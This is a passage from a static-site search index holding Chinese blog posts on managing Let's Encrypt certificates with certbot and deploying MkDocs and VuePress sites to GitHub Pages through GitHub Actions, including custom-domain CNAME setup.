\u7aef\u53e3\u5df2\u7ecf\u88ab <code>nginx</code>\uff08\u6216\u8005\u5176\u4ed6\u670d\u52a1\uff09\u5360\u7528\u4e86\uff1a</p> <pre><code>certbot certonly --nginx -d example.com -d www.example.com -d another.example.com\n</code></pre> </li> <li> <p>\u4f60\u7684 <code>80</code> \u7aef\u53e3\u6ca1\u6709\u88ab\u4efb\u4f55\u670d\u52a1\u5360\u7528\uff1a</p> <pre><code>certbot certonly --standalone -d example.com -d www.example.com -d another.example.com\n</code></pre> </li> </ul>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_3","title":"\u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\uff08\u4e5f\u53eb\u901a\u914d\u7b26\u8bc1\u4e66\uff09","text":"<p>\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u5728 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e <code>TXT</code> \u8bb0\u5f55\u3002\u5e76\u4e14\u53ea\u80fd\u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f\u6765\u7eed\u671f\u3002</p> <pre><code>certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-staging-v02.api.letsencrypt.org/directory\n</code></pre> <p>\u5176\u4e2d <code>--server</code> \u53c2\u6570\u6240\u6307\u5411\u7684 url \u4e5f\u8bb8\u4f1a\u53d8\u5316\uff0c\u4f46\u662f\u4f60\u603b\u80fd\u5728 Let's Encrypt \u7684 \u6587\u6863 \u4e0a\u627e\u5230\u6700\u65b0\u7684\u3002</p> <p>\u6267\u884c\u4e4b\u540e\u4f1a\u4ea4\u7ed9\u4f60\u4e00\u4e2a\u6216\u4e24\u4e2a\u8bbe\u7f6e <code>TXT</code> \u8bb0\u5f55\u7684\u4efb\u52a1\u3002\u53bb\u4f60\u7684 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e\u597d\u5373\u53ef\u3002</p>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_4","title":"\u67e5\u770b\u81ea\u52a8\u7eed\u671f\u7684\u8ba1\u5212\u4efb\u52a1","text":"<pre><code>systemctl list-timers\n</code></pre>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_5","title":"\u624b\u52a8\u4e3a\u8bc1\u4e66\u7eed\u671f","text":"<ul> <li> <p>\u4e0d\u52a0\u4efb\u4f55\u53c2\u6570\uff0c\u6ca1\u6709\u4e34\u8fd1\u5230\u671f\u65f6\u95f4\u7684\u8bdd\u4f1a\u505c\u6b62\u6267\u884c</p> <pre><code>certbot renew\n</code></pre> </li> <li> <p>\u6d4b\u8bd5\u7eed\u671f\uff0c\u4e0d\u4f1a\u771f\u7684\u7eed\u671f</p> <pre><code>certbot renew --dry-run\n</code></pre> </li> <li> <p>\u5f3a\u5236\u7eed\u671f</p> <pre><code>certbot renew --force-renewal\n</code></pre> </li> </ul>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_6","title":"\u4e3a\u8bc1\u4e66\u7eed\u671f\uff08\u6cdb\u57df\u540d\uff09","text":"<p>\u6cdb\u57df\u540d\u8bc1\u4e66\u4e0d\u80fd\u901a\u8fc7 <code>certbot renew</code> \u6765\u7eed\u671f\uff0c\u9700\u8981\u624b\u52a8\u7eed\u671f\u3002\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <p>\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u4f60\u5728\u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\u7684\u65f6\u5019\u5728 DNS \u670d\u52a1\u5546\u90a3\u91cc\u6dfb\u52a0\u7684 <code>TXT</code> \u8bb0\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f1a\u53d8\u5316\u7684\u503c\u3002</p> <p>\u7eed\u671f\u65b9\u6cd5\u548c\u7533\u8bf7\u65b9\u6cd5\u4e00\u6a21\u4e00\u6837\uff0c\u76f8\u5f53\u4e8e\u91cd\u65b0\u7533\u8bf7\u4e00\u6b21\u3002</p> <pre><code>certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-staging-v02.api.letsencrypt.org/directory\n</code></pre> <p>\u4e2d\u9014\u540c\u6837\u9700\u8981\u4fee\u6539 DNS \u7684 <code>TXT</code> \u8bb0\u5f55\u8fd9\u6837\u7684\u64cd\u4f5c\u3002\u6709\u4eba\u53ef\u80fd\u4f1a\u89c9\u5f97\u5f88\u9ebb\u70e6\uff0c\u9ebb\u70e6\u4f60\u5c31\u53bb\u5199\u4e2a\u811a\u672c\u554a\u3002</p> <p>\u4e8b\u5b9e\u4e0a certbot \u7684\u62a5\u9519\u4e5f\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u4ed6\u7684\u610f\u601d\u5c31\u662f\u8981\u6211\u4eec\u53bb\u5199\u4e2a\u811a\u672c\uff1a</p> <p>An authentication script must be provided with --manual-auth-hook when using the manual plugin non-interactively.</p> <p>\u7f51\u4e0a\u6709\u5404\u4e2a\u7248\u672c\u7684\u811a\u672c\uff0c\u5927\u6982\u539f\u7406\u90fd\u662f\u901a\u8fc7\u4f60 DNS \u670d\u52a1\u5546\u63d0\u4f9b\u7684 Token\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u76f4\u63a5\u4fee\u6539 DNS \u7684 <code>TXT</code> \u8bb0\u5f55\u3002\u4e00\u641c\u4e00\u5927\u5806\u3002</p>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_7","title":"\u540a\u9500\uff08\u64a4\u9500\uff09\u8bc1\u4e66","text":"<p>\u8fd9\u91cc\u76f4\u63a5\u5f15\u7528 Let's Encrypt \u5b98\u7f51</p> <ul> <li> <p>\u7528\u9881\u53d1\u8bc1\u4e66\u7684\u8d26\u6237\u540a\u9500\u8bc1\u4e66</p> <pre><code>certbot revoke --cert-path /etc/letsencrypt/archive/${YOUR_DOMAIN}/cert1.pem\n</code></pre> </li> <li> <p>\u4f7f\u7528\u8bc1\u4e66\u79c1\u94a5\u540a\u9500\u8bc1\u4e66</p> <pre><code>certbot revoke --cert-path /PATH/TO/cert.pem --key-path /PATH/TO/key.pem\n</code></pre> </li> <li> <p>\u4f7f\u7528\u5176\u4ed6\u6388\u6743\u5e10\u6237\u540a\u9500\u8bc1\u4e66</p> <p>\u5148\u4ece crt.sh \u4e2d\u4e0b\u8f7d\u8bc1\u4e66\uff0c\u7136\u540e\uff1a</p> <pre><code>certbot revoke --cert-path /PATH/TO/downloaded-cert.pem\n</code></pre> </li> </ul>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-certbot/#_8","title":"\u5220\u9664\u8bc1\u4e66","text":"<pre><code>certbot delete </code></pre>","tags":["ssl","letsencrypt","certbot"]},{"location":"blog/2022/220407-github-pages/","title":"GitHub Pages \u6587\u6863\u81ea\u52a8\u5316\u90e8\u7f72 - MkDocs","text":"<p>\u8fd9\u7bc7\u6587\u7ae0\u8bb2\u8ff0\u4e86\u5982\u4f55\u4f7f\u7528 GitHub Actions / Pages \u81ea\u52a8\u5316\u90e8\u7f72\u6587\u6863\uff0c\u4ee5\u53ca\u9047\u5230\u7684\u5751\u3002</p> <p>\u5982\u4f60\u6240\u89c1\uff0c\u8fd9\u4e2a\u535a\u5ba2\u4e5f\u662f\u4f7f\u7528 GitHub Actions \u81ea\u52a8\u90e8\u7f72\u5728 GitHub Pages \u4e0a\u7684\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u5c06\u4ee5 MkDocs \u4e3a\u4f8b\u8bb2\u8ff0\u3002</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#_1","title":"\u672c\u5730\u90e8\u7f72\u6d4b\u8bd5","text":"<p>\u9996\u5148\u4f60\u81ea\u5df1\u642d\u5efa\u7684\u6587\u6863\u5f97\u5728\u672c\u5730\u80fd\u7528\u561b\uff0c\u9996\u5148\u6d4b\u8bd5\u4e0b\u672c\u5730\u662f\u5426\u80fd\u7528\uff1a</p> <pre><code>mkdocs serve\n</code></pre> <p>\u5c0f\u63d0\u793a</p> <p>\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u53ef\u4ee5\u4f7f mkdocs \u8fd0\u884c\u5728\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\u4e0a\uff1a <pre><code>mkdocs serve -a localhost:8001\nmkdocs serve --dev-addr localhost:8001\n</code></pre></p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#vcs-github","title":"\u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub \u5173\u8054","text":"<p>\u8fd9\u91cc\u4ee5 PyCharm \u4e3a\u4f8b\uff1a</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#vcs","title":"\u521b\u5efa\u672c\u5730 VCS","text":"<pre><code>graph LR\n  A[VCS] --&gt; B;\n  B[\u542f\u7528\u7248\u672c\u63a7\u5236\u96c6\u6210] --&gt; C;\n  C[\u9009\u62e9 Git] --&gt; D[\u786e\u5b9a];</code></pre> <p>\u6ce8\u610f\u6709\u5751</p> <p>\u8bb0\u5f97\u5728\u63d0\u4ea4\u4e4b\u524d\u5148\u521b\u5efa\u597d <code>.gitignore</code> \u6587\u4ef6\uff0c\u5426\u5219\u4f60\u63d0\u4ea4\u4e4b\u540e\u8fd8\u8981\u7ee7\u7eed\u63d0\u4ea4\u4e00\u6b21 <code>.gitignore</code> \u6587\u4ef6\u3002</p> <p>\u7136\u540e\u9009\u62e9\u63d0\u4ea4\u3002</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#github","title":"\u548c GitHub \u5173\u8054","text":"<p>\u8fd9\u4e00\u6b65\u5176\u5b9e\u662f\u5728 GitHub \u4e0a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u4ed3\u5e93\u3002\u5982\u679c\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\u7684\u8bdd\uff0c\u53ef\u80fd\u9700\u8981 Merge \u6216\u8005 Rebase\u3002</p> <pre><code>graph LR\n  A[Git] --&gt; B;\n  B[GitHub] --&gt; C;\n  C[\u5728 GitHub \u4e0a\u5171\u4eab\u9879\u76ee] --&gt; D[\u786e\u5b9a];</code></pre>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#github-actions","title":"\u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1","text":"<p>\u8fd9\u4e00\u6b65\u5751\u5de8\u591a\u3002</p> <p>\u9996\u5148\u70b9\u51fb <code>Actions</code> -&gt; <code>set up a workflow yourself</code></p> <p>\u6309\u7167\u4efb\u4f55\u4e00\u4e2a\u4f60\u80fd\u627e\u5230\u7684 Pages \u90e8\u7f72\u6587\u6863\u6765\u5199\u8fd9\u4e2a <code>yml</code> \u6587\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u91c7\u7528 Material for MkDocs \u7684\u6a21\u677f\u3002</p> <p>\u5c0f\u63d0\u793a</p> <p>\u7528 MkDocs \u5b98\u7f51 \u7684\u4e5f\u884c\uff0c\u53ea\u4e0d\u8fc7\u4eba\u5bb6\u4e0d\u4f1a\u544a\u8bc9\u4f60\u600e\u4e48\u5199\u8fd9\u4e2a <code>yml</code> \u6587\u4ef6\u3002</p> <p>\u5728 <code>2022\u5e744\u67086\u65e5</code> \u7684\u65f6\u5019\u6211\u4ece\u8fd9\u91cc\u627e\u5230\u7684\u6a21\u677f\u662f\u8fd9\u6837\u7684\uff0c\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u53ef\u80fd\u4f1a\u6709\u53d8\u66f4\uff0c\u5efa\u8bae\u4ece\u539f\u6587\u6863\u53bb\u590d\u5236\u3002</p> main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09<pre><code>name: ci on:\npush:\nbranches:\n- master - main\njobs:\ndeploy:\nruns-on: ubuntu-latest\nsteps:\n- uses: actions/checkout@v2\n- uses: actions/setup-python@v2\nwith:\npython-version: 3.x\n- run: pip install mkdocs-material - run: mkdocs gh-deploy --force\n</code></pre> <p>\u6ce8\u610f\u6709\u5751</p> <p>\u9996\u5148\u4ed6\u8fd9\u4e2a\u6d41\u7a0b\uff0c\u5f88\u660e\u663e\u53ea\u7528 <code>pip</code> \u5b89\u88c5\u4e86 <code>mkdocs-material</code>\uff0c\u4f46\u662f\u5b83\u5e76\u6ca1\u6709\u5b89\u88c5 <code>mkdocs</code>\u3002\u5176\u5b9e\u8fd9\u65e0\u6240\u8c13\uff0c\u56e0\u4e3a <code>mkdocs-material</code> \u7684 <code>requirements.txt</code> \u4e2d\u5df2\u7ecf\u5305\u542b\u4e86 <code>mkdocs</code>\uff0c\u4f1a\u4e00\u5e76\u5b89\u88c5\u3002 \u91cd\u70b9\u7684\u5730\u65b9\u662f\uff0c\u5982\u679c\u4f60\u5728\u672c\u5730\u6784\u5efa\u7684\u65f6\u5019\u4f9d\u8d56\u4e86\u5176\u4ed6\u7684\u5e93\uff08\u6bd4\u5982 <code>mkdocs-blogging-plugin</code>\uff09\uff0c\u90a3\u4f60\u5f97\u5728 <code>run:</code> \u4e2d\u901a\u8fc7 <code>pip install</code> \u5b89\u88c5\u8fd9\u4e9b\u5e93\u3002</p> <p>\u6ce8\u610f\u6709\u5751</p> <p>\u5751\u8fd8\u6ca1\u5b8c\uff0c\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\u662f <code>mkdocs-blogging-plugin</code> \u7684\u4f7f\u7528\u8005\uff0c\u4f60\u8fd8\u4f1a\u9047\u5230\u7f51\u7ad9\u7684\u6e32\u67d3\u95ee\u9898\uff0c\u8fd9\u91cc\u5b98\u7f51\u4e5f\u7ed9\u4e86\u89e3\u51b3\u65b9\u6848\u3002 https://liang2kl.codes/mkdocs-blogging-plugin/#publish-with-github-pages \u6ce8\u610f\uff0c\u8bf7\u4e0d\u8981\u8ddf\u968f\u5b98\u7f51\u90a3\u7bc7\u6587\u6863\u91cc\u6240\u8bf4\u7684\u8bbe\u5b9a <code>locale: zh-CN</code> \u8fd9\u4e2a\u952e\uff0c\u540e\u9762\u4f1a\u8bf4\u5230\u539f\u56e0\u3002</p> <p>\u6700\u7ec8\u6211\u7684 <code>main.yml</code>\uff08\u540e\u6765\u91cd\u547d\u540d\u6210 <code>ci.yml</code> \u4e86\uff09\u957f\u8fd9\u6837\uff1a</p> main.yml<pre><code>name: ci on:\npush:\nbranches:\n- master jobs:\ndeploy:\nruns-on: ubuntu-latest\nsteps:\n- uses: actions/checkout@v2\nwith:  # mkdocs-blogging-plugin \u7ed9\u51fa\u7684\u6e32\u67d3\u95ee\u9898\u89e3\u51b3\u65b9\u6848\nfetch-depth: 0\n- uses: actions/setup-python@v2\nwith:\npython-version: 3.x\n- run: pip install mkdocs\n- run: pip install mkdocs-material\n- run: pip install mkdocs-blogging-plugin  # \u8bb0\u5f97\u5b89\u88c5\u5176\u4ed6\u4f9d\u8d56\u7684\u5e93\n- run: mkdocs gh-deploy --force\n</code></pre> <p>\u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u53ef\u4ee5\u5728 Actions \u9875\u9762\u70b9 <code>Start commit</code> \u4e86\u3002\u53ea\u8981\u4f60\u7684\u672c\u5730\u90e8\u7f72\u53ef\u4ee5\u901a\u8fc7\uff0c\u5728 Actions \u4e0a\u5e94\u8be5\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u7684\u3002</p> <p>\u5982\u679c Actions \u7684 <code>build</code> \u6216\u8005 <code>deploy</code> \u9636\u6bb5\u51fa\u73b0\u4e86\u95ee\u9898\uff0c\u8bf4\u660e\u53ef\u80fd\u662f\u90a3\u51e0\u4e2a <code>run</code> \u91cc\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u90a3\u4f60\u5e94\u8be5\u5728\u672c\u5730\u8bd5\u4e00\u4e0b\uff1a</p> <ul> <li>\u662f\u4e0d\u662f\u6709\u5305\u5fd8\u4e86 <code>pip install</code> \uff1f</li> <li>\u672c\u5730\u80fd\u6b63\u5e38 <code>mkdocs build</code> \u561b\uff1f</li> </ul> <p>\u4e4b\u524d\u9047\u5230\u4e86\u4e00\u4e2a\u5178\u578b\u7684\u95ee\u9898\u5bfc\u81f4 build \u5931\u8d25\uff1a</p> <p>\u6ce8\u610f\u6709\u5751</p> <p><code>mkdocs-blogging-plugin</code> \u7684\u5b98\u7f51 \u6587\u6863 \u91cc\u8bf4\uff0c\u8981\u5728 <code>blogging</code> \u91cc\u5efa\u4e00\u4e2a <code>locale: zh-CN</code> \u6765\u8bbe\u7f6e\u65f6\u95f4\u683c\u5f0f\uff0c\u4f46\u662f\u5b9e\u9645\u8fd9\u6837\u505a\u4f1a\u62a5\u9519\uff1a<code>ValueError: expected only letters, got 'zh-cn'</code>\uff0c \u89e3\u51b3\u65b9\u6cd5\uff1a\u4e0d\u8981\u5199 <code>locale: zh-CN</code>\uff0c\u8981\u5199 <code>locale: zh_CN</code> \u6216\u8005\u5e72\u8106\u5199 <code>locale: zh</code></p> mkdocs.yml<pre><code>plugins:\n- blogging:\nlocale: zh_CN\n</code></pre> <p>\u5751\u8fd8\u6ca1\u7ed3\u675f\uff0c\u7ee7\u7eed\u5f80\u4e0b\u770b</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#pages","title":"\u8bbe\u7f6e Pages","text":"<p>\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u7ed3\u675f\u4e86\uff1f</p> <p>\u8fd8\u6ca1\u6709\uff01</p> <p>Actions \u7ed3\u675f\u540e\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u9875\u9762\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u81ea\u5df1\u53bb\u627e\uff09\uff0c\u4f60\u70b9\u5f00\u8fd9\u4e2a\u9875\u9762\u4f1a\u76f4\u63a5\u544a\u8bc9\u4f60 <code>404</code>\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u4e3a Pages \u6307\u5b9a\u5177\u4f53\u7684\u9875\u9762\u3002</p> <p>\u5c0f\u63d0\u793a</p> <p>\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\uff0c\u5f88\u591a\u4eba\u8ba4\u4e3a <code>Actions</code> \u548c <code>Pages</code> \u662f\u4e00\u4e2a\u4e1c\u897f\uff0c\u56e0\u4e3a\u5f88\u591a\u4eba\u7ecf\u5e38\u7528\u8fd9\u4fe9\u4e00\u8d77\u6765\u90e8\u7f72\u9875\u9762\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u4fe9\u7684\u529f\u80fd\u662f\u5404\u6709\u5206\u5de5\u3002  - <code>Actions</code> \u7684\u4e3b\u8981\u529f\u80fd\u662f\u7f16\u8bd1\uff0c\u5c31\u662f\u4f60\u6307\u5b9a\u4e00\u4e2a\u73af\u5883\uff0c\u7ed9\u51fa\u4e00\u4e9b\u7f16\u8bd1\u4e2d\u8981\u6267\u884c\u7684\u547d\u4ee4\u884c\uff0c\u7136\u540e\u7ed9\u51fa\u4f60\u7684\u6e90\u4ee3\u7801\uff08\u8fd9\u91cc\u7684\u6e90\u4ee3\u7801 GitHub \u4f1a\u81ea\u52a8\u4ece\u4f60\u7684 repo \u91cc\u83b7\u53d6\u6240\u4ee5\u4e0d\u7528\u7ba1\uff09\uff0cGitHub Actions \u5c31\u4f1a\u4ece\u6e90\u4ee3\u7801\u91cc\u7f16\u8bd1\u51fa\u5bf9\u5e94\u7684\u9759\u6001\u6587\u4ef6\uff0c\u8fd9\u4e9b\u9759\u6001\u6587\u4ef6\u53ef\u80fd\u662f\u5404\u79cd\u6587\u4ef6\uff0c\u6bd4\u5982\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u8005\u662f\u7f51\u9875\u3002  - <code>Pages</code> \u7684\u4e3b\u8981\u529f\u80fd\u662f\u5728 <code>&lt;user&gt;.github.io</code> \u4e0a\u90e8\u7f72\u7f51\u9875\u3002</p> <p>Actions \u6bd5\u7adf\u53ea\u662f Actions\uff0c\u4ed6\u53c8\u4e0d\u662f\u548c Pages \u8054\u52a8\u7684\uff0c\u6240\u4ee5\u4f60\u5c31\u7b97 Actions \u7f16\u8bd1\u51fa\u4e86\u7f51\u9875\u4e5f\u662f\u4e0d\u4f1a\u7ed9\u4f60\u81ea\u52a8\u90e8\u7f72\u5230 Pages \u4e0a\u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u624b\u52a8\u8bbe\u7f6e Pages\uff1a</p> <pre><code>graph LR\n  A[\u6253\u5f00\u4f60\u7684\u9879\u76ee\u4ed3\u5e93] --&gt; B;\n  B[Settings] --&gt; C;\n  C[Pages] --&gt; D[Source];</code></pre> <p>\u9009\u62e9\u5206\u652f\u4e3a <code>gh-pages</code>\uff0c\u8fd9\u662f Actions \u81ea\u52a8\u6784\u5efa\u7684\u6587\u4ef6\u6240\u5b58\u653e\u7684\u5206\u652f\uff0c\u76ee\u5f55\u9009\u62e9 <code>/</code>\u3002</p> <p>\u70b9 <code>save</code>\uff0c\u8fd9\u4e0b\u662f\u771f\u6ca1\u95ee\u9898\u4e86\u3002</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220407-github-pages/#_2","title":"\uff08\u53ef\u9009\uff09\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d","text":"<p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d\u53c8\u4f1a\u5e26\u6765\u4e24\u4e2a\u5751\uff0c\u65e0\u8bed\u3002</p> <p>\u9996\u5148\u4f60\u5728\u8bbe\u7f6e <code>Source</code> \u7684\u65f6\u5019\uff0c\u80fd\u770b\u5230\u4e0b\u9762\u4e00\u680f\u662f <code>Custom domain</code>\uff0c\u8fd9\u4e2a\u5c31\u662f\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u6211\u8fd9\u4e2a\u535a\u5ba2\u6784\u5efa\u5728\u4e86 https://zhanbao2000.github.io/blog \uff0c\u4f46\u662f\u6211\u60f3\u8ba9 https://blog.arisa.moe/ \u6307\u5411\u8fd9\u4e2a\u535a\u5ba2\uff0c\u5c31\u5f97\u4fee\u6539\u8fd9\u73a9\u610f\u3002</p> <p>\u5c0f\u63d0\u793a</p> <p>\u73b0\u5728\u8bbf\u95ee https://zhanbao2000.github.io/blog \u4f1a\u88ab <code>301</code> \u91cd\u5b9a\u5411\u5230 https://blog.arisa.moe/</p> <p>\u76f4\u63a5\u5728\u6846\u6846\u91cc\u5199\u4f60\u7684\u57df\u540d\u80af\u5b9a\u662f\u4e0d\u884c\u7684\uff0c\u5e94\u8be5\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u4ee5\u672c\u7ad9\u4e3a\u4f8b\uff1a</p> <ol> <li> <p>\u627e\u5230\u4f60\u57df\u540d\u7684 DNS \u670d\u52a1\u5546\uff0c\u6dfb\u52a0\u4e00\u4e2a CNAME \u8bb0\u5f55\uff1a     <pre><code>blog.arisa.moe. 1   IN  CNAME   zhanbao2000.github.io.\n</code></pre></p> </li> <li> <p>\u5728\u521a\u521a\u90a3\u4e2a\u6846\u91cc\u8f93\u5165 <code>blog.arisa.moe</code>\uff0c\u70b9 <code>save</code>\u3002</p> </li> </ol> <p>\u8fc7\u4e00\u4f1a\u5c31\u597d\u4e86\u3002</p> <p>\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff1f</p> <p>\u6ce8\u610f\u6709\u5751</p> <p>\u5982\u679c\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff0c\u7b49\u4f60\u4e0b\u6b21\u518d\u901a\u8fc7 <code>git push</code> \u63d0\u4ea4\u6587\u6863/\u535a\u5ba2\u7684\u65f6\u5019\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u5df2\u7ecf\u53d8\u6210 <code>404</code> \u4e86\u3002 \u6b64\u65f6\u4f60\u6253\u5f00 GitHub \u5bf9\u5e94\u4ed3\u5e93\u7684 Settings \u4e00\u770b\uff0c\u597d\u5bb6\u4f19\uff0c\u6846\u6846\u91cc\u4ec0\u4e48\u90fd\u6ca1\u6709\u4e86\u3002</p> <p>\u5148\u8bf4\u89e3\u51b3\u65b9\u6cd5\u518d\u8bf4\u539f\u56e0\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u5728 <code>docs</code> \u6587\u4ef6\u5939\u91cc\u521b\u5efa\u4e00\u4e2a <code>CNAME</code> \u6587\u4ef6\uff0c\u5185\u5bb9\u5199\u4e0a\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4e0b\u6b21 Actions \u8fd0\u884c\u7684\u65f6\u5019\uff0cPages \u5c31\u4f1a\u81ea\u52a8\u628a\u8fd9\u4e2a\u57df\u540d\u8bbe\u7f6e\u6210\u81ea\u5b9a\u4e49\u57df\u540d\u4e86\u3002</p> <p>\u53c2\u8003\u4ee5\u4e0b\uff1a</p> <ul> <li>Deploying seems to overwrite custom domain #213</li> <li>gh-pages -d dist overwrites custom domain #127</li> <li>MkDocs - Custom Domains \ud83d\udc49 \u5176\u5b9e MkDocs \u5b98\u7f51\u6709\u5199</li> </ul> <p>\u8fd9\u4e9b issues \u65e0\u4e00\u4f8b\u5916\u90fd\u63d0\u5230\u4e86\u8981\u521b\u5efa\u4e00\u4e2a <code>CNAME</code> \u6587\u4ef6\u6765\u6307\u793a\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u3002\u4f46\u662f\u8ddd\u79bb issue \u63d0\u51fa\u597d\u50cf\u5df2\u7ecf\u8fc7\u4e865\u5e74\u4e86\u4e5f\u6ca1\u89c1\u5230 GitHub \u5b98\u65b9\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u6211\u81ea\u5df1\u63a8\u6d4b\u7684\u539f\u56e0\u662f\u8fd9\u6837\u7684\uff1a</p> <p>\u5728 Pages \u9875\u9762\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u662f\u5728\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u81ea\u52a8\u521b\u5efa\u4e86\u4e00\u4e2a <code>CNAME</code> \u6587\u4ef6\u7684\uff0c\u548c\u6211\u4eec\u624b\u52a8\u521b\u5efa\u7684\u6548\u679c\u4e00\u6837\u3002\u4f46\u662f\u5728 Actions \u8fd0\u4f5c\u7684\u65f6\u5019\uff0c\u4f1a\u8986\u76d6\u6389\u6574\u4e2a\u9879\u76ee\u751f\u6210\u76ee\u5f55\uff0c\u5305\u62ec\u8fd9\u4e2a <code>CNAME</code> \u6587\u4ef6\u3002</p> <p>\u90a3\u4e48\u5c31\u6709\u4e24\u4e2a\u529e\u6cd5\u6765\u89e3\u51b3\uff1a</p> <ul> <li>\u6bcf\u6b21 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u624b\u52a8\u53bb Pages \u9875\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u57df\u540d\u3002</li> <li>\u8ba9 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u59cb\u7ec8\u6709\u8fd9\u4e2a <code>CNAME</code> \u6587\u4ef6\u3002</li> </ul> <p>\u4e8e\u662f\u6211\u4eec\u9009\u62e9\u4e86\u540e\u8005\u3002</p>","tags":["github actions","github pages","mkdocs"]},{"location":"blog/2022/220408-github-pages-2/","title":"GitHub Pages \u6587\u6863\u81ea\u52a8\u5316\u90e8\u7f72 - VuePress","text":"<p>\u4e0a\u4e00\u7bc7\u535a\u5ba2\u8bf4\u5230\u4e86 MkDocs \u90e8\u7f72\u9047\u5230\u7684\u5751\uff0c\u8fd9\u7bc7\u6587\u7ae0\u6765\u8bf4\u8bf4 VuePress \u7684\u90e8\u7f72\u3002</p> <p>\u6ce8\u610f</p> <p>\u6211\u4f7f\u7528\u7684\u662f VuePress v1.x\uff0c\u8de8\u7248\u672c\u51fa\u73b0\u7684\u5751\u672c\u4eba\u4e00\u6982\u4e0d\u77e5\u3002</p>","tags":["github actions","github pages","vuepress"]},{"location":"blog/2022/220408-github-pages-2/#_1","title":"\u672c\u5730\u90e8\u7f72\u6d4b\u8bd5","text":"<p>\u9996\u5148\u540c\u6837\u662f\u672c\u5730\u90e8\u7f72</p> npmyarn <pre><code>npm run docs:build\n</code></pre> <pre><code>yarn docs:build\n</code></pre> <p>\u8981\u662f\u672c\u5730\u7f16\u8bd1\u90fd\u6ca1\u6cd5\u901a\u8fc7\uff0c\u90a3\u5c31\u522b\u7ee7\u7eed\u4e86\u3002</p>","tags":["github actions","github pages","vuepress"]},{"location":"blog/2022/220408-github-pages-2/#github-actions","title":"\u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1","text":"<p>\u8ba9\u6211\u4eec\u8df3\u8fc7\u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub 